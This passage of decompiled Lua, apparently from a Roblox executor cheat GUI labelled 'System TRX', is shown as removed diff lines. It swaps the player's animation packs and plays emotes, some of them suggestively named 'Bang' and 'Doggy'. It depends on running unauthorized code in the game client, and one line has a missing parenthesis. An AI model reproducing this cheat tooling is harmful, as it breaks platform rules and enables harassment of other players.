-            v708.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
-            v708.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
-            v708.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
-            v708.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
-            v708.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
-            v708.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
-            vu38.Character.Humanoid:ChangeState(3)
-            v708.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v293.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v709 = vu38.Character.Animate
-            v709.Disabled = true
-            StopAnim()
-            v709.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
-            v709.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
-            v709.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
-            v709.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
-            v709.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
-            v709.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
-            v709.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
-            vu38.Character.Humanoid:ChangeState(3)
-            v709.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7
-        end
-    end)
-    v294.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v710 = vu38.Character.Animate
-            v710.Disabled = true
-            StopAnim()
-            v710.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
-            v710.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
-            v710.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
-            v710.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
-            v710.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
-            v710.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
-            v710.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
-            vu38.Character.Humanoid:ChangeState(3)
-            v710.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v295.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v711 = vu38.Character.Animate
-            v711.Disabled = true
-            StopAnim()
-            v711.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4708191566"
-            v711.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4708192150"
-            v711.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=4708193840"
-            v711.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4708192705"
-            v711.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=4708188025"
-            v711.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=4708184253"
-            v711.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=4708186162"
-            vu38.Character.Humanoid:ChangeState(3)
-            v711.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v296.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v712 = vu38.Character.Animate
-            v712.Disabled = true
-            StopAnim()
-            v712.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
-            v712.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
-            v712.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
-            v712.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
-            v712.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
-            v712.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
-            v712.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
-            vu38.Character.Humanoid:ChangeState(3)
-            v712.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v301.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v713 = vu38.Character.Animate
-            v713.Disabled = true
-            StopAnim()
-            v713.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
-            v713.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
-            v713.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
-            v713.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
-            v713.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
-            v713.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
-            v713.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
-            vu38.Character.Humanoid:ChangeState(3)
-            v713.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v302.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v714 = vu38.Character.Animate
-            v714.Disabled = true
-            StopAnim()
-            v714.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
-            v714.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
-            v714.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
-            v714.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
-            v714.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
-            v714.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
-            v714.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
-            vu38.Character.Humanoid:ChangeState(3)
-            v714.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v303.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v715 = vu38.Character.Animate
-            v715.Disabled = true
-            StopAnim()
-            v715.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
-            v715.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
-            v715.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
-            v715.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
-            v715.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
-            v715.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
-            v715.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
-            vu38.Character.Humanoid:ChangeState(3)
-            v715.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v304.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v716 = vu38.Character.Animate
-            v716.Disabled = true
-            StopAnim()
-            v716.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
-            v716.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
-            v716.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
-            v716.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
-            v716.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
-            v716.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
-            v716.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
-            vu38.Character.Humanoid:ChangeState(3)
-            v716.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v305.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v717 = vu38.Character.Animate
-            v717.Disabled = true
-            StopAnim()
-            v717.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
-            v717.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
-            v717.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
-            v717.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
-            v717.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1150944216"
-            v717.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
-            v717.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
-            vu38.Character.Humanoid:ChangeState(3)
-            v717.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    v306.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            local v718 = vu38.Character.Animate
-            v718.Disabled = true
-            StopAnim()
-            v718.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
-            v718.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
-            v718.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=3489174223"
-            v718.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=3489173414"
-            v718.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
-            v718.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
-            v718.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
-            vu38.Character.Humanoid:ChangeState(3)
-            v718.Disabled = false
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-        end
-    end)
-    getgenv().CrazyAnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v719 = Instance.new("Animation")
-            v719.AnimationId = "rbxassetid://10713957138"
-            local v720, v721, v722 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v723
-                v722, v723 = v720(v721, v722)
-                if v722 == nil then
-                    break
-                end
-                if v723.Animation.AnimationId ~= v719.AnimationId then
-                    v723:Stop()
-                else
-                    v723:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v724 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v719)
-                v724.Priority = Enum.AnimationPriority.Action
-                v724.Looped = true
-                v724:Play()
-                v724:AdjustSpeed(4)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    getgenv().B3b3AnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v725 = Instance.new("Animation")
-            v725.AnimationId = "rbxassetid://13694096724"
-            local v726, v727, v728 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v729
-                v728, v729 = v726(v727, v728)
-                if v728 == nil then
-                    break
-                end
-                if v729.Animation.AnimationId ~= v725.AnimationId then
-                    v729:Stop()
-                else
-                    v729:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v730 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v725)
-                v730.Priority = Enum.AnimationPriority.Action
-                v730.Looped = false
-                v730:Play()
-                v730.TimePosition = 2
-                v730:AdjustSpeed(0)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    getgenv().Sb3awyAnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v731 = Instance.new("Animation")
-            v731.AnimationId = "rbxassetid://10214311282"
-            local v732, v733, v734 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v735
-                v734, v735 = v732(v733, v734)
-                if v734 == nil then
-                    break
-                end
-                if v735.Animation.AnimationId ~= v731.AnimationId then
-                    v735:Stop()
-                else
-                    v735:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v736 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v731)
-                v736.Priority = Enum.AnimationPriority.Action
-                v736.Looped = false
-                v736:Play()
-                v736.TimePosition = 0.8
-                v736:AdjustSpeed(0)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    getgenv().ZombieWalkAnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v737 = Instance.new("Animation")
-            v737.AnimationId = "rbxassetid://708553116"
-            local v738, v739, v740 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v741
-                v740, v741 = v738(v739, v740)
-                if v740 == nil then
-                    break
-                end
-                if v741.Animation.AnimationId ~= v737.AnimationId then
-                    v741:Stop()
-                else
-                    v741:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v737):Play(0.1, 1, 1)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    getgenv().AhmAhmAnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v742 = Instance.new("Animation")
-            v742.AnimationId = "rbxassetid://120452122477461"
-            local v743, v744, v745 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v746
-                v745, v746 = v743(v744, v745)
-                if v745 == nil then
-                    break
-                end
-                if v746.Animation.AnimationId ~= v742.AnimationId then
-                    v746:Stop()
-                else
-                    v746:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v747 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v742)
-                v747.Looped = true
-                v747:Play(0.1, 1, 1)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    getgenv().FlingArmsAnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v748 = Instance.new("Animation")
-            v748.AnimationId = "rbxassetid://754656200"
-            local v749, v750, v751 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v752
-                v751, v752 = v749(v750, v751)
-                if v751 == nil then
-                    break
-                end
-                if v752.Animation.AnimationId ~= v748.AnimationId then
-                    v752:Stop()
-                else
-                    v752:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v753 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v748)
-                v753.Looped = true
-                v753:Play(0.1, 1, 3)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    getgenv().DolphinAnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v754 = Instance.new("Animation")
-            v754.AnimationId = "rbxassetid://10714068222"
-            local v755, v756, v757 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v758
-                v757, v758 = v755(v756, v757)
-                if v757 == nil then
-                    break
-                end
-                if v758.Animation.AnimationId ~= v754.AnimationId then
-                    v758:Stop()
-                else
-                    v758:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v759 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v754)
-                v759.Priority = Enum.AnimationPriority.Action
-                v759.Looped = true
-                v759:Play()
-                v759:AdjustSpeed(2)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    getgenv().FaintAnimationR6.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-            getgenv().idkjustcheck = false
-            local v760 = Instance.new("Animation")
-            v760.AnimationId = "rbxassetid://181526230"
-            local v761, v762, v763 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v764
-                v763, v764 = v761(v762, v763)
-                if v763 == nil then
-                    break
-                end
-                if v764.Animation.AnimationId ~= v760.AnimationId then
-                    v764:Stop()
-                else
-                    v764:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v765 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v760)
-                v765.Priority = Enum.AnimationPriority.Action
-                v765.Looped = false
-                v765:Play()
-                v765.TimePosition = 0.1
-                v765:AdjustSpeed(0)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R6", 7)
-            return
-        end
-    end)
-    getgenv().ArmcutAnimationR6.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-            getgenv().idkjustcheck = false
-            local v766 = Instance.new("Animation")
-            v766.AnimationId = "rbxassetid://33169583"
-            local v767, v768, v769 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v770
-                v769, v770 = v767(v768, v769)
-                if v769 == nil then
-                    break
-                end
-                if v770.Animation.AnimationId ~= v766.AnimationId then
-                    v770:Stop()
-                else
-                    v770:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v771 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v766)
-                v771.Priority = Enum.AnimationPriority.Action
-                v771.Looped = false
-                v771:Play()
-                v771.TimePosition = 0.64
-                v771:AdjustSpeed(0)
-                SendNotify("System TRX", "\239\191\189\216\167\216\176 \216\167\217\132\216\167\217\134\217\133\217\138\216\180\217\134 \217\133\217\129\217\138\216\175 \216\168\217\133\216\167\216\168 \216\167\217\132\217\130\217\134\216\167\216\168\217\132", 3)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R6", 7)
-            return
-        end
-    end)
-    getgenv().BoxesAnimationR6.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-            getgenv().idkjustcheck = false
-            local v772 = Instance.new("Animation")
-            v772.AnimationId = "rbxassetid://126753849"
-            local v773, v774, v775 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v776
-                v775, v776 = v773(v774, v775)
-                if v775 == nil then
-                    break
-                end
-                if v776.Animation.AnimationId ~= v772.AnimationId then
-                    v776:Stop()
-                else
-                    v776:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v777 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v772)
-                v777.Priority = Enum.AnimationPriority.Action
-                v777.Looped = true
-                v777:Play()
-                v777:AdjustSpeed(3)
-                SendNotify("System TRX", "\239\191\189\216\167\216\176 \216\167\217\132\216\167\217\134\217\133\217\138\216\180\217\134 \217\133\217\129\217\138\216\175 \216\168\217\133\216\167\216\168 \216\167\217\132\217\130\217\134\216\167\216\168\217\132", 3)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R6", 7)
-            return
-        end
-    end)
-    getgenv().SaluteAnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v778 = Instance.new("Animation")
-            v778.AnimationId = "rbxassetid://10714389988"
-            local v779, v780, v781 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v782
-                v781, v782 = v779(v780, v781)
-                if v781 == nil then
-                    break
-                end
-                if v782.Animation.AnimationId ~= v778.AnimationId then
-                    v782:Stop()
-                else
-                    v782:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v783 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v778)
-                v783.Priority = Enum.AnimationPriority.Action
-                v783.Looped = false
-                v783:Play()
-                v783.TimePosition = math.max(v783.Length - 1, 0)
-                v783:AdjustSpeed(0)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    getgenv().DoggyAnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v784 = Instance.new("Animation")
-            v784.AnimationId = "rbxassetid://13694096724"
-            local v785, v786, v787 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v788
-                v787, v788 = v785(v786, v787)
-                if v787 == nil then
-                    break
-                end
-                if v788.Animation.AnimationId ~= v784.AnimationId then
-                    v788:Stop()
-                else
-                    v788:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v789 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v784)
-                v789.Priority = Enum.AnimationPriority.Action
-                v789.Looped = false
-                v789:Play()
-                v789.TimePosition = 3.45
-                v789:AdjustSpeed(0)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    getgenv().SleepyAnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v790 = Instance.new("Animation")
-            v790.AnimationId = "rbxassetid://10714360343"
-            local v791, v792, v793 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v794
-                v793, v794 = v791(v792, v793)
-                if v793 == nil then
-                    break
-                end
-                if v794.Animation.AnimationId ~= v790.AnimationId then
-                    v794:Stop()
-                else
-                    v794:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v795 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v790)
-                v795.Priority = Enum.AnimationPriority.Action
-                v795.Looped = false
-                v795:Play()
-                v795.TimePosition = 0.37
-                v795:AdjustSpeed(0)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    getgenv().HugAnimationR6.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-            getgenv().idkjustcheck = false
-            local v796 = Instance.new("Animation")
-            v796.AnimationId = "rbxassetid://185299570"
-            local v797, v798, v799 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v800
-                v799, v800 = v797(v798, v799)
-                if v799 == nil then
-                    break
-                end
-                if v800.Animation.AnimationId ~= v796.AnimationId then
-                    v800:Stop()
-                else
-                    v800:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v801 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v796)
-                v801.Priority = Enum.AnimationPriority.Action
-                v801.Looped = false
-                v801:Play()
-                v801:AdjustSpeed(0)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R6", 7)
-            return
-        end
-    end)
-    getgenv().BangAnimationR6.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-            getgenv().idkjustcheck = false
-            local v802 = Instance.new("Animation")
-            v802.AnimationId = "rbxassetid://148840371"
-            local v803, v804, v805 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v806
-                v805, v806 = v803(v804, v805)
-                if v805 == nil then
-                    break
-                end
-                if v806.Animation.AnimationId ~= v802.AnimationId then
-                    v806:Stop()
-                else
-                    v806:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v807 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v802)
-                v807.Priority = Enum.AnimationPriority.Action
-                v807.Looped = true
-                v807:Play()
-                v807:AdjustSpeed(2.5)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R6", 7)
-            return
-        end
-    end)
-    getgenv().IllusionAnimationR6.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-            getgenv().idkjustcheck = false
-            local v808 = Instance.new("Animation")
-            v808.AnimationId = "rbxassetid://215384594"
-            local v809, v810, v811 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v812
-                v811, v812 = v809(v810, v811)
-                if v811 == nil then
-                    break
-                end
-                if v812.Animation.AnimationId ~= v808.AnimationId then
-                    v812:Stop()
-                else
-                    v812:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v813 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v808)
-                v813.Priority = Enum.AnimationPriority.Action
-                v813.Looped = true
-                v813:Play()
-                v813:AdjustSpeed(7)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R6", 7)
-            return
-        end
-    end)
-    getgenv().FloatingHeadAnimationR6.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-            getgenv().idkjustcheck = false
-            local v814 = Instance.new("Animation")
-            v814.AnimationId = "rbxassetid://121572214"
-            local v815, v816, v817 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v818
-                v817, v818 = v815(v816, v817)
-                if v817 == nil then
-                    break
-                end
-                if v818.Animation.AnimationId ~= v814.AnimationId then
